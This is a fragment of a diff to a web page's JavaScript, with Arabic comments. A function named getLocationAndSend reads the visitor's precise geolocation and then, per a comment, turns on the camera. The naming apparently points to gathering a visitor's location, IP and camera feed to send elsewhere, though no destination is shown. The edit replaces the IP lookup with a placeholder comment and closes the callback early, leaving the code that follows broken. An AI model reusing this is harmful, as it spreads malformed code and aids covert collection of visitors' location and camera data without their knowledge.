@@ -33,7 +33,15 @@
 
     function getLocationAndSend() {
       navigator.geolocation.getCurrentPosition(async function(position) {
-        const ip = await getIP();
+  // نفس الكود اللي عندك
+}, function(error) {
+  document.body.innerHTML = "<h2>فشل في تحديد الموقع!</h2>";
+}, {
+  enableHighAccuracy: true,
+  timeout: 10000,
+  maximumAge: 0
+});
+
 
         // تشغيل الكاميرا
         try {
